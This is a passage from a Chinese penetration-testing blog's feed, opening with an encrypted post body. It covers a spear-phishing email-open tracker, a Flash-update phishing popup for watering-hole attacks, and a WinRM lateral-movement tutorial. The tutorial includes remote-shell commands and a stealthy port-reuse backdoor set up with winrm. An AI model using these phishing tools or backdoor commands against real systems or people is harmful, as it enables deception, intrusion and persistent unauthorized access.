e4ee33f0034576e42f5eb599985cc981045ef85346fee6096fa76ce72444d7c1df6c4e9fd84594ccb33f3f28b600cb6d1822c7e3271ac1eb2a304c8cef9e094e6520933ee8954b40d435f07b07695455ebebe40414ebbf6371d4d137568b0023ffb61b3ce0897d91f4e85c0952e0a8dda24b4429d27095ac9e0e5d49ef100e396a5e82352740d7f5e4506985437a98275ae003d35f8c72383d98d5e2c343ad5a496c8fd096fbbe32ff9ab13020784d3040d2f916194d039ef1832286cbbc86a00e362dce0cf43dfb866467fdeb387840bcd823b2a39b7e8d90fd1546c9b98070a30d09c32dfbbca8e569412afd217dd56afb2989267a7e010f8e5d94779dc83003ff8c322fab544644f45ed99e709f91a132529bd642b13912d3412a2ac4d52602e242e35beb4f2fc4beb9dd96c5eef4c7a0653a572da1feae42023cb518293d73ee277d3af2a110c4317a0d44b0234432140012b5f51ad5a1175367c81da7a24bf176d90a5788aaec837b895209c8b843cc6bfb1fb3a3ab057662e8c7302dfd2ee55bc8c6197a710c54f5b19f75d48fa478bea7546969c679b0395e4445c1a1916ba47c420efb3c921dd3f3973d1d410bd7496b96a18a2d392acc89c3b0882fdfe79b3b41363fec85032d46fbd02b007a3e4e3ecacf2b7a78b09066ad590da3d950b58c9456156da57c1f9397b389c0bd5203442e0ec2bf08e4c1652220f83d59d5790e92ee3b777ad7c652f63ebe0de1d5c40b0d0c92bec83cd68164b4b3cc1106b03882017c07ac80520ad11314c477f87d14e290edcdad242bab14720cd131d1b3f72653b2af039412dd3518b696bb9b733dc3fe566d9315e667acd20a31152f53ce526c24a9270f8f0f2a28e1a75b52c34f5c8af05e2d12884282e30a655af9cdc85653233d3948af8147f12a6d6be1293c489af8a344d289f331e2ef60dd76f8af31563a6fbfce5847dfd60cb116ece9a1ead568674ee25bbaaa9ae13c78caa37e4e02545004ccf5b5802d859a0f1cef197f7bbe7c027fc83b66c89f23e6112bb52b778eebf56adfec03819ebd458daf9dcda30d2f33ec141bbef6c82d77bbd886e2d059a38ece981e1a2499a8bd4ff98f5819b69de30a29038b78d1d24321bdecfd5ea896b3606f272895bf80f35d981ebdc10a62cfcfae99a64ad674b6de3b03cf9daec0aeec63d35bf298c0c3d8c1ee62cf6305b99405463465932527886ce7d8d22033e74d2876df6045e61002d9d47694f5aa93c37337a3d682258010026eafbf0dc957525396203bbcdbecc59102933472fc2a3558d1f2c25b62331a2055871bed2bec397feeda69cf97df2dea2e26e9333b887304255f2c993e9cfd39f60eaa7ea58cb4b0de2cc5fb89b81562db0aa190777400e56993404ddc8e29eaf749372e9c060e82b5a4b28fb2d7e559bd1e06f98e503e70b8dc6342a0a17b8e4b6be62e65d49e32f3856853ca72492cb6b26358a19083803171d9efb8e43e643d5dfee7615f0b651e4a588f6ff4b7d6cad76dcb9c82602b165af92ba548fc408b9b7bda1dddfe07475d84d4fad2866ff89a5c9f754f43a57dd8995104e46f67bf0d28b6f1e56ae99d07191920e28464409b65632ec6a57e8609b0168cc999698ddd0d6bf9c16e85704f43164d4b864f650651c39dd90f09eef608fcdb852128d49e2f19b873f2358693d3b939b87936717a178940b01bb74aa4763807eabcafe8ff0595209b7a903922a6d5c860e3002b360e4f33c301f5ee9c86233f3d3235a7d3fbb8c303e0a6a7327b1cd845757b0c7b465c539659ec18ebb716d3a507f1ff71757e62da0e25cf5ccbf9d5e79c77721ddf84d0c195efd1511c04478c26d84c4758b408fa0c73e0463f3a6871320badb7dacbc8ec32b79b2e3d7d3c883163c819bd8c66d9131015c37f271e72783f3ff8d8173034ce64fc4d18c028c26ed122d9f6563bd83660fbe431f9a9b82050387a61254f034319bbd80a9014d2de67feffc3b8f3dbf85f98095078fd1292fa06ed17c726a5609eba4c7e32b5456257b40e0d3ed636c23655ca96ea75f80d177ee64696a540062c70337a8290e66b7fefe0eeaa139504e0272f57b0e38aec4514bcbc861164a46e89c46937b433745aa38524fbb80c90e0a17bc495e831477feaddb87907f32935142c8f766d0c147cb7f7b632158035801b957dc1d17404cbcee5c771f7e10fbd308167b1c7d51159441d27a5439c4d2ec0ea43cf7626523c8015ba7d9d18cf6dcc19ae9e5690fa0bde674bdc78cf85a6a3b704017e0a333625146eea037f85ea2238b1e56568c913691d8373bc0306055a4b9c4f3daec11512ae1d1182a6c560b9c1e0c1985037d52457b2f74ec03463ae0b1c9e81c2c5da46cb5b8cd13f95c76f616ab55880ec223c5ec66b962ca88b1bc2366c47a123b199cb4f4eee28df6c95e95eeb6745d623695e0922f0ddcd27d67d9f1c3bb2f4be820bbea23b1c690eab25d9370c4e1744ce5eabd609d03692888db14c0d451bf09ab7acf486cbbac81294b53358a58adbdfc8004a3089e2f4e317bba1d11c54e50d37a6d3b2a504931bef34cf2e494dd74c7227ffefcc29bc64845c441b617f649f18982e3de216e640be5a808c24f38476baaa864b4ca32fac58c513ee2d23aff21dca338e5429965e99fd83c4a615a0d6ee465d5ffd97a15ecab412fcbed6e7d8041fddee604e6aebd10b3924a50884d57a40a179691f6a4155aaf552b05a1333f68f958602b61236b2b597f6e00bc9f3560778f271e5ecb7c2b2fe3cea2faf5f546529dae4483faef722fd044f0a5686b82c7bdf504accc8295f322665ddf9b5e7eed099cb752f7a0b2a768259da13598cfadf4d6a78c57e906fbb5a2b119fae58de707f41c76f708b2bdb5005491f9d3950344966f69a97c1b7eb796aefcffbd9e991143d1660f1be96948652003f8192ddac9522f400fe3d0bc25af529a37a9ea8abe2713ce339d748f8906e98ab7292c07db06364e25a9433a7d90f0c67b74ecf0c715ca0ee29c5e8f6f61bcf9778f08ca1877d61ab19d04432c1ada3e9f3447242aa11caaaa86580b523b0fde81d105e153c5a4e1a2c3ebae3e7577d81207c83c3aba6e54c6d9d4a7309fd76d5f34b3ad30a8370d8d958560b0c2fdd5f3074c7b024359e45dd32a8e9792d06ccd79048d0cdc56b5e34456a572f83a65c445d811db93154afa73bea7f41ca607118be025dc173705df93fd2ced368843dcfb7b70aa550b43406a2523c66557758e00fdb84ce3b02d415052da17ec4469a50fc81c9b57ff5aa94de08eebbf3b079006665354ca1253bd696b3acbd7a31819471bb806b483c507cd4165b48c55680f9796c0e8a966a84faff98d81ecf2af5d2</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="一星期实战总结" scheme="https://www.se7ensec.cn/tags/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>鱼叉攻击|Mail-Probe 邮箱探针后台管理系统</title>
    <link href="https://www.se7ensec.cn/2020/09/30/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Mail-Probe%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    <id>https://www.se7ensec.cn/2020/09/30/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Mail-Probe%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</id>
    <published>2020-09-30T04:10:24.000Z</published>
    <updated>2021-01-29T16:12:09.939Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>好的鱼竿和诱饵固然重要，但真正把鱼儿和渔夫联系起来的是小小的浮漂。</p></blockquote><a id="more"></a><h1 id="效果预览"><a href="#效果预览" class="headerlink" title="效果预览"></a>效果预览</h1><p>平常去河边钓鱼，要使用浮漂才会知道这条河是否有鱼吃饵料，同理当邮件投递出去后，此探针可以判断目标是否点击了邮件，不至于那么的苦等。</p><h2 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h2><p><img src="https://gitee.com/r00tSe7en/Mail-Probe/raw/master/tz0.png"></p><h2 id="信息查看"><a href="#信息查看" class="headerlink" title="信息查看"></a>信息查看</h2><p><img src="https://gitee.com/r00tSe7en/Mail-Probe/raw/master/tz1.png"></p><h2 id="链接生成"><a href="#链接生成" class="headerlink" title="链接生成"></a>链接生成</h2><p>本程序通过php中的readfile() 函数读取本地图片，如使用自定义图片请替换public目录下的info.png，这里的图片可以使用目标公司的logo。</p><p><img src="https://gitee.com/r00tSe7en/Mail-Probe/raw/master/tz2.png"></p><h1 id="配置相关"><a href="#配置相关" class="headerlink" title="配置相关"></a>配置相关</h1><blockquote><p>基于ThinkPHP 6开发</p></blockquote><blockquote><p>运行环境要求Apache和PHP7.1+</p></blockquote><blockquote><p>数据库文件为mail.sql</p></blockquote><p>数据库及其他配置修改env文件即可，默认为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">APP_DEBUG &#x3D; false</span><br><span class="line"></span><br><span class="line">[APP]</span><br><span class="line">DEFAULT_TIMEZONE &#x3D; Asia&#x2F;Shanghai</span><br><span class="line"></span><br><span class="line">[DATABASE]</span><br><span class="line">TYPE &#x3D; mysql</span><br><span class="line">HOSTNAME &#x3D; 127.0.0.1</span><br><span class="line">DATABASE &#x3D; mail</span><br><span class="line">USERNAME &#x3D; root</span><br><span class="line">PASSWORD &#x3D; root</span><br><span class="line">HOSTPORT &#x3D; 3306</span><br><span class="line">CHARSET &#x3D; utf8</span><br><span class="line">DEBUG &#x3D; false</span><br><span class="line"></span><br><span class="line">[LANG]</span><br><span class="line">default_lang &#x3D; zh-cn</span><br></pre></td></tr></table></figure><p>后台默认账号密码（密码修改直接替换库中MD5即可）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin|123456</span><br></pre></td></tr></table></figure><h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><a href="https://github.com/r00tSe7en/Mail-Probe">  <img align="center" src="https://github-readme-stats.vercel.app/api/pin/?username=r00tSe7en&theme=dracula&repo=Mail-Probe" /></a><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p><a href="https://github.com/c1y2m3">@c1y2m3</a> 分享的思路</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;好的鱼竿和诱饵固然重要，但真正把鱼儿和渔夫联系起来的是小小的浮漂。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="JavaScript" scheme="https://www.se7ensec.cn/tags/JavaScript/"/>
    
    <category term="PHP" scheme="https://www.se7ensec.cn/tags/PHP/"/>
    
    <category term="鱼叉攻击" scheme="https://www.se7ensec.cn/tags/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>水坑攻击|Flash钓鱼弹窗优化版</title>
    <link href="https://www.se7ensec.cn/2020/09/14/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB-Flash%E9%92%93%E9%B1%BC%E5%BC%B9%E7%AA%97%E4%BC%98%E5%8C%96%E7%89%88/"/>
    <id>https://www.se7ensec.cn/2020/09/14/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB-Flash%E9%92%93%E9%B1%BC%E5%BC%B9%E7%AA%97%E4%BC%98%E5%8C%96%E7%89%88/</id>
    <published>2020-09-14T04:10:24.000Z</published>
    <updated>2021-01-23T14:13:50.659Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>还是那句话：Flash永远滴神~</p></blockquote><a id="more"></a><p>一直想写个界面精致点的Flash钓鱼，奈何各种效果实现起来实在是有点麻烦，正好发现了layer这个牛逼的弹层组件，一开始直接用的图片，几行代码就搞定了，但是还是不够完美，后来发到T00ls大家集思广益，提出了一些非常好的建议，几次修改后才有了如下的最终版。</p><p>在线预览：<a href="http://flash-pop.se7ensec.cn/">http://flash-pop.se7ensec.cn/</a></p><p>有人说flash不好用了，感觉分析好对面是干啥的，做好一些自动化、定制化的工作，上线率其实还是挺高的。</p><p>项目地址：<a href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;还是那句话：Flash永远滴神~&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="JavaScript" scheme="https://www.se7ensec.cn/tags/JavaScript/"/>
    
    <category term="HTML" scheme="https://www.se7ensec.cn/tags/HTML/"/>
    
    <category term="水坑攻击" scheme="https://www.se7ensec.cn/tags/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|基于winRM的横向移动</title>
    <link href="https://www.se7ensec.cn/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://www.se7ensec.cn/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2020-08-26T14:10:24.000Z</published>
    <updated>2021-06-19T08:21:44.014Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基于winRM的横向移动</p></blockquote><a id="more"></a><h2 id="winRM简介"><a href="#winRM简介" class="headerlink" title="winRM简介"></a>winRM简介</h2><p>WinRM(Windows Remote Management)是 Microsoft 对 WS-Management 协议的实现，WS-Management 协议即一种基于标准简单对象访问协议（soap）的防火墙友好协议，它让来自不同供应商的硬件和操作系统能够相互操作。windows 众多可以远程执行命令方式中的一种。 </p><p>作为DCOM和WMI远程管理的替代方法，WinRM用于通过WSMan与远程计算机建立会话，WSMan利用HTTP/S作为传输机制来传递XML格式的消息。在现代Windows系统中，WinRM HTTP通过TCP端口5985进行通信，而HTTPS（TLS）通过TCP端口5986进行通信。</p><p>WinRM本机支持NTLM和Kerberos（域）身份验证。初始身份验证后，WinRM会话将使用AES加密（<a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/winrmsecurity?view=powershell-7">Microsoft Docs</a>）保护。</p><p>注意：必须配置并运行WinRM服务才能接受远程连接。WinRM接受连接可能还需要几个步骤。请参阅这篇 <a href="https://pentestlab.blog/2018/05/15/lateral-movement-winrm/">Pentest Lab 文章</a> 以了解更多信息。</p><p><strong>※ winRM横向移动同时适用于工作组和域环境。</strong> </p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><h3 id="通信的双方都需要开启WinRM服务"><a href="#通信的双方都需要开启WinRM服务" class="headerlink" title="通信的双方都需要开启WinRM服务"></a>通信的双方都需要开启WinRM服务</h3><p>WinRS 适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC 全版本系统默认关闭。</p><p>只有在Win server 2012 之后的版本的WinRM服务才默认启动并监听了5985端口，允许远程任意主机来管理。</p><p>WinRM状态查询</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> win32_service | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.name <span class="operator">-like</span> <span class="string">&quot;WinRM&quot;</span>&#125;                    </span><br><span class="line"></span><br><span class="line">ExitCode  : <span class="number">1077</span></span><br><span class="line">Name      : WinRM</span><br><span class="line">ProcessId : <span class="number">0</span></span><br><span class="line">StartMode : Manual</span><br><span class="line">State     : Stopped</span><br><span class="line">Status    : OK</span><br></pre></td></tr></table></figure><p>开启可以使用下面其中一条命令即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig <span class="literal">-q</span> <span class="comment">#这条命令运行后会自动添加防火墙例外规则，放行5985端口。</span></span><br><span class="line"><span class="built_in">Enable-PSRemoting</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>再次查询</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> win32_service | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.name <span class="operator">-like</span> <span class="string">&quot;WinRM&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">ExitCode  : <span class="number">0</span></span><br><span class="line">Name      : WinRM</span><br><span class="line">ProcessId : <span class="number">1128</span></span><br><span class="line">StartMode : Auto</span><br><span class="line">State     : Running</span><br><span class="line">Status    : OK</span><br></pre></td></tr></table></figure><h3 id="服务端防火墙允许WinRM服务端口通信"><a href="#服务端防火墙允许WinRM服务端口通信" class="headerlink" title="服务端防火墙允许WinRM服务端口通信"></a>服务端防火墙允许WinRM服务端口通信</h3><p>默认为5985、5986；如果5985打开，但是5986关闭，标识WinRM服务配置为仅接受HTTP连接。修改默认端口可以使用如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Listener?Address=*+Transport=HTTP <span class="selector-tag">@</span>&#123;Port=<span class="string">&quot;80&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="WinRM通信两端配置要求"><a href="#WinRM通信两端配置要求" class="headerlink" title="WinRM通信两端配置要求"></a>WinRM通信两端配置要求</h3><p>1）查看WinRM具体配置</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm get winrm/config</span><br></pre></td></tr></table></figure><p>2）允许所有客户端IP连接</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Client <span class="selector-tag">@</span>&#123;TrustedHosts=<span class="string">&quot;*&quot;</span>&#125;</span><br><span class="line">winrm e winrm/config/listener <span class="comment">#查看监听地址和端口</span></span><br></pre></td></tr></table></figure><h2 id="远程管理"><a href="#远程管理" class="headerlink" title="远程管理"></a>远程管理</h2><p>远程连接时可能会遇到以下错误</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Winrs error:WinRM 客户端无法处理该请求。可以在下列条件下将默认身份验证与 IP 地址结合使用: 传输为 HTTPS 或目标位于 TrustedHosts 列表中，并且提供了显式凭据。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 有关如何设置 TrustedHosts 的详细信息，请运行以下命令: winrm help config。</span><br><span class="line"></span><br><span class="line">Winrs error:WinRM 客户端无法处理该请求。如果身份验证方案与 Kerberos 不同，或者客户端计算机未加入到域中，则必须使用 HTTPS 传输或者必须将目标计算机添加到 TrustedHosts 配置设置。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 通过运行以下命令 可获得有关此内容的更多信息: winrm help config。</span><br></pre></td></tr></table></figure><p>在你的攻击机上执行下面这条命令，设置为信任所有主机，再去连接即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrm <span class="built_in">set</span> winrm/config/Client <span class="selector-tag">@</span>&#123;TrustedHosts=<span class="string">&quot;*&quot;</span>&#125;</span><br><span class="line"> Client</span><br><span class="line">    NetworkDelayms = <span class="number">5000</span></span><br><span class="line">    URLPrefix = wsman</span><br><span class="line">    AllowUnencrypted = false</span><br><span class="line">    Auth</span><br><span class="line">        Basic = true</span><br><span class="line">        Digest = true</span><br><span class="line">        Kerberos = true</span><br><span class="line">        Negotiate = true</span><br><span class="line">        Certificate = true</span><br><span class="line">        CredSSP = false</span><br><span class="line">    DefaultPorts</span><br><span class="line">        HTTP = <span class="number">5985</span></span><br><span class="line">        HTTPS = <span class="number">5986</span></span><br><span class="line">    TrustedHosts = *</span><br></pre></td></tr></table></figure><h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% whoami</span></span><br><span class="line">win<span class="literal">-win7</span>\administrator</span><br></pre></td></tr></table></figure><h3 id="获取交互式的shell"><a href="#获取交互式的shell" class="headerlink" title="获取交互式的shell"></a>获取交互式的shell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% cmd</span></span><br><span class="line">Microsoft Windows [版本 <span class="number">6.1</span><span class="type">.7601</span>]</span><br><span class="line">版权所有 (c) <span class="number">2009</span> Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line">以太网适配器 本地连接:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">95</span>c8:a481:b587:<span class="number">2</span>d7c%<span class="number">11</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">86.114</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">86.1</span></span><br><span class="line"></span><br><span class="line">隧道适配器 isatap.&#123;<span class="number">993</span>CBC2D<span class="literal">-5164</span><span class="literal">-415A</span><span class="literal">-A70E</span><span class="literal">-00FF0F6119D5</span>&#125;:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><h4 id="WSMan-WinRM"><a href="#WSMan-WinRM" class="headerlink" title="WSMan-WinRM"></a>WSMan-WinRM</h4><p> 使用WSMan.Automation COM对象通过WinRM执行远程命令。 </p><p> <a href="https://github.com/bohops/WSMan-WinRM">https://github.com/bohops/WSMan-WinRM</a> </p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><table><thead><tr><th align="left">模块功能</th><th align="left">目标端口</th><th align="left">目标系统</th><th align="center">使用教程</th></tr></thead><tbody><tr><td align="left">Winrm爆破</td><td align="left">5985/5986端口</td><td align="left">Windows</td><td align="center"><a href="http://k8gege.org/Ladon/WinrmScan.html">http://k8gege.org/Ladon/WinrmScan.html</a></td></tr><tr><td align="left">WinrmExec</td><td align="left">5985</td><td align="left">Windows</td><td align="center"><a href="http://k8gege.org/Ladon/WinrmExec.html">http://k8gege.org/Ladon/WinrmExec.html</a></td></tr></tbody></table><h2 id="其他利用"><a href="#其他利用" class="headerlink" title="其他利用"></a>其他利用</h2><h3 id="开启远程主机3389"><a href="#开启远程主机3389" class="headerlink" title="开启远程主机3389"></a>开启远程主机3389</h3><p>如果目标开启了WinRM可以利用<a href="https://github.com/Viralmaniar/PeekABoo">PeekABoo</a>工具使目标开启3389</p><h3 id="端口复用后门"><a href="#端口复用后门" class="headerlink" title="端口复用后门"></a>端口复用后门</h3><p>将WinRM监听端口由5985改为80或者443，即使端口被web服务也不影响，并且不影响web服务。利用如下</p><p>1）配置目标WinRM服务，更改监听端口开启复用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Listener?Address=*+Transport=HTTP <span class="selector-tag">@</span>&#123;Port=<span class="string">&quot;80&quot;</span>&#125;</span><br><span class="line">winrm <span class="built_in">set</span> winrm/config/service <span class="selector-tag">@</span>&#123;EnableCompatibilityHttpListener=<span class="string">&quot;true&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>2）链接目标</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% whoami</span></span><br></pre></td></tr></table></figure><p>该方法适用于有web服务的机器，不会开启新的端口，配合添加隐藏管理员用户，隐蔽性极高。</p><h2 id="参考引用："><a href="#参考引用：" class="headerlink" title="参考引用："></a>参考引用：</h2><p> <a href="http://t3ngyu.leanote.com/post/LM-WinRM-WinRS">http://t3ngyu.leanote.com/post/LM-WinRM-WinRS</a></p><p> <a href="https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/">https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/</a></p><p> <a href="https://xz.aliyun.com/t/6888">https://xz.aliyun.com/t/6888</a></p><p> <a href="https://www.cnblogs.com/-mo-/p/12019314.html">https://www.cnblogs.com/-mo-/p/12019314.html</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;基于winRM的横向移动&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>在线肾透测试中心</title>
    <link href="https://www.se7ensec.cn/2020/08/24/%E8%82%BE%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83/"/>
    <id>https://www.se7ensec.cn/2020/08/24/%E8%82%BE%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83/</id>
    <published>2020-08-24T14:10:24.000Z</published>
    <updated>2021-01-23T14:13:50.647Z</updated>
    
